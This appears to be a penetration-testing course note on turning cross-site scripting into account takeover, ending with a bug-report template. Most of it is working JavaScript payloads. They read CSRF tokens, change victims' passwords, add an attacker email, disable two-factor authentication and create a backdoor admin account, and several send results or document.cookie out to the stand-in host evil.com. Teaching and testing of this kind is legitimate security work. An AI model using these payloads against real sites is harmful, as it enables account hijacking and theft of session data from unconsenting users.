---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.17 XSS to Account Takeover"
---

# 07.17 — XSS to Account Takeover

## Overview

Account Takeover (ATO) via XSS goes beyond session hijacking. Even when HttpOnly cookies block cookie theft, XSS can still perform actions AS the victim — changing passwords, adding attacker emails, disabling 2FA, or creating admin accounts. The browser executes JavaScript from the victim's origin, so the victim's authenticated cookies go with every request automatically.

```
XSS + VICTIM'S BROWSER = FULL POWER OF VICTIM'S ACCOUNT

  VICTIM TRIGGERS XSS
         ↓
  JS RUNS IN VICTIM'S BROWSER
         ↓
  VICTIM'S COOKIES AUTO-INCLUDED IN ALL REQUESTS
         ↓
  MAKE API CALLS AS VICTIM:
    - Change password
    - Add attacker email  
    - Disable 2FA
    - Elevate privileges
    - Create backdoor admin
         ↓
  ATTACKER MAINTAINS ACCESS EVEN AFTER SESSION EXPIRES!
```

---

## Step 1: Read the CSRF Token

Most protected actions require a CSRF token. With XSS, you can read it directly from the page:

```javascript
// METHOD 1: FROM A META TAG:
var csrf = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

// METHOD 2: FROM A HIDDEN INPUT FIELD:
var csrf = document.querySelector('input[name="_token"]').value;
var csrf = document.querySelector('input[name="csrf_token"]').value;
var csrf = document.querySelector('#csrf_field').value;

// METHOD 3: FROM A COOKIE (if CSRF is stored there):
var csrf = document.cookie.match(/csrftoken=([^;]+)/)?.[1];
var csrf = document.cookie.match(/XSRF-TOKEN=([^;]+)/)?.[1];

// METHOD 4: FETCH THE PAGE FIRST AND PARSE:
fetch('/settings').then(r=>r.text()).then(html=>{
  var parser = new DOMParser();
  var doc = parser.parseFromString(html, 'text/html');
  var csrf = doc.querySelector('input[name="_token"]').value;
  // Now use csrf for further requests
});
```

---

## Account Takeover — Change Password

```javascript
// ASSUMES: CSRF token readable, password change doesn't require old password

// STEP 1: GET CSRF TOKEN
// STEP 2: CHANGE PASSWORD

var xss_payload = `
fetch('/settings', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  var parser = new DOMParser();
  var doc = parser.parseFromString(html,'text/html');
  var csrf = doc.querySelector('input[name="_token"]').value;
  
  return fetch('/settings/password', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type':'application/x-www-form-urlencoded'},
    body: '_token='+csrf+'&password=Hacked123!&password_confirmation=Hacked123!'
  });
}).then(r=>r.text()).then(html=>{
  fetch('https://evil.com/done?html='+btoa(html), {mode:'no-cors'});
});
`;

// NOW ATTACKER CAN LOG IN WITH:
// Username: victim@target.com
// Password: Hacked123!
```

---

## Account Takeover — Add Attacker's Email (Email Takeover)

```javascript
// MANY APPS ALLOW ADDING SECONDARY EMAILS
// Once attacker's email is added → use "forgot password" to take over!

var payload = `
fetch('/account/emails', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  var parser = new DOMParser();
  var doc = parser.parseFromString(html,'text/html');
  var csrf = doc.querySelector('meta[name="csrf-token"]').content;
  
  return fetch('/account/emails', {
    method:'POST',
    credentials:'include',
    headers:{
      'Content-Type':'application/x-www-form-urlencoded',
      'X-CSRF-TOKEN': csrf
    },
    body:'email=attacker@evil.com'
  });
})
.then(()=>fetch('https://evil.com/email_added',{mode:'no-cors'}));
`;

// AFTER EMAIL ADDED:
// Attacker verifies their email
// Uses "forgot password" → password reset sent to attacker@evil.com
// → Full account access!
```

---

## Account Takeover — Disable 2FA

```javascript
// IF APP HAS 2FA THAT CAN BE DISABLED WITHOUT PASSWORD:

var payload = `
fetch('/security/2fa', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  var doc = new DOMParser().parseFromString(html,'text/html');
  var csrf = doc.querySelector('[name="csrf_token"]').value;
  
  return fetch('/security/2fa/disable', {
    method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'csrf_token='+csrf
  });
}).then(()=>{
  // ALSO steal the session cookie if it's not HttpOnly:
  new Image().src='https://evil.com/done?c='+document.cookie;
});
`;
// NOW: Account has no 2FA + attacker stole the session cookie
```

---

## Account Takeover — Create Admin Account (Critical)

```javascript
// WHEN XSS TARGETS AN ADMIN USER:
// Admin's browser runs the XSS → create new admin-level account!

var payload = `
fetch('/admin/users', {credentials:'include'})
.then(r=>r.text())
.then(html=>{
  var doc = new DOMParser().parseFromString(html,'text/html');
  var csrf = doc.querySelector('[name="_token"]').value;
  
  return fetch('/admin/users/create', {
    method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'_token='+csrf+'&username=backdoor&email=attacker@evil.com&password=AttackerPass1!&role=admin'
  });
}).then(r=>r.text()).then(html=>{
  fetch('https://evil.com/created?'+btoa(html),{mode:'no-cors'});
});
`;
// NEW ADMIN ACCOUNT CREATED!
// Attacker now has permanent admin access via backdoor account
```

---

## Account Takeover — Complete Chained Payload

```javascript
// REALISTIC ATO PAYLOAD (stored XSS in victim's profile):
// Executes when admin views the reported profile

(function(){
  // Step 1: Get settings page with CSRF
  fetch('/admin/settings',{credentials:'include'})
  .then(r=>r.text())
  .then(html=>{
    var csrf = new DOMParser()
               .parseFromString(html,'text/html')
               .querySelector('[name="csrf"]')?.value;
    
    if(!csrf) {
      // Fallback: get from meta tag
      csrf = document.querySelector('meta[name="csrf-token"]')?.content;
    }
    
    // Step 2: Change admin password
    return fetch('/admin/change-password',{
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRF-Token':csrf},
      body:'new_password=Backdoor2024!&confirm=Backdoor2024!'
    });
  })
  .then(r=>r.json())
  .then(resp=>{
    // Step 3: Report back
    fetch('https://evil.com/pwned?resp='+btoa(JSON.stringify(resp)),{mode:'no-cors'});
  })
  .catch(e=>{
    fetch('https://evil.com/error?e='+btoa(e.toString()),{mode:'no-cors'});
  });
})();
```

---

## Reporting Account Takeover XSS

```
SEVERITY: CRITICAL (for stored XSS → admin ATO)
         HIGH (for reflected XSS → user ATO via phishing link)

REPORT TEMPLATE:

TITLE: Stored XSS in [Field] Leads to Full Account Takeover

DESCRIPTION:
  A stored XSS vulnerability in [location] allows an attacker to execute
  JavaScript in victims' browsers. This was demonstrated to result in full
  account takeover by:
  1. Reading the victim's CSRF token
  2. Changing the victim's password to an attacker-controlled value
  3. Logging in with the new credentials

IMPACT:
  - Complete account takeover without phishing or user interaction beyond
    viewing a page
  - Persistent access even after session expiry (password changed)
  - Affects all users who view [page/profile/comment]
  - Escalates to admin account takeover if an admin views the payload

STEPS TO REPRODUCE:
  1. [Submit XSS payload to field]
  2. [Trigger rendering]
  3. [Show incoming request to attacker server]
  4. [Show successful login with new password]

CVSS: 9.0 (Critical) — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
```

---

## Related Notes
- [[16 - XSS to Session Hijacking]] — cookie theft approach
- [[03 - Stored XSS]] — stored XSS for persistent impact
- [[05 - Blind XSS]] — targeting admin users
- [[18 - XSS to CSRF]] — making API calls via XSS
- [[Module 10 - Authentication]] — auth mechanisms
